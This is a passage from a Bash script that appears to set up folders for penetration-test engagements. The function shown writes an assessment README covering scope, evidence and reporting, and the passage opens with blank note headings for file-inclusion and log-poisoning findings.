- **Local file inclusion:** 
- **Remote file inclusion:** 
- **Log poisoning:** " failed_ref
}

# Function to create assessment README
_create_assessment_readme() {
    local type=$1
    local assessment_name
    
    case $type in
        1) assessment_name="External Network Assessment" ;;
        2) assessment_name="Internal Network Assessment" ;;
        3) assessment_name="Web Application Assessment" ;;
        *) assessment_name="Security Assessment" ;;
    esac
    
    cat > "README.md" << EOF
# $assessment_name

## Project Overview
- **Assessment Type:** $assessment_name
- **Created:** $(date +%Y-%m-%d)
- **Target:** ${final_ip:-"TBD"}
- **Tester:** $USER

## Directory Structure
\`\`\`
$(tree -L 2 2>/dev/null || find . -type d | head -20)
\`\`\`

## Quick Start
1. Review scope in \`01-Admin/2-Scope.md\`
2. Update contact information in \`01-Admin/1-Admin Information.md\`
3. Follow TODO items in \`01-Admin/5-TODO.md\`
4. Document findings in \`03-Evidence/\` directories

## Key Files
- **Admin Information:** \`01-Admin/1-Admin Information.md\`
- **Scope:** \`01-Admin/2-Scope.md\`
- **TODO List:** \`01-Admin/5-TODO.md\`
- **Evidence:** \`03-Evidence/\` directory structure

## Reporting
- Evidence should be documented as you go
- Screenshots go in \`03-Evidence/2-Pics/\`
- Command outputs in respective note files
- Final report structure in \`04-Reporting/\`

## Notes
- All timestamps are in local time
- Clean up activities tracked in \`01-Admin/4-Clean-Up.md\`
- Questions for client in \`01-Admin/3-Questions.md\`
EOF
}
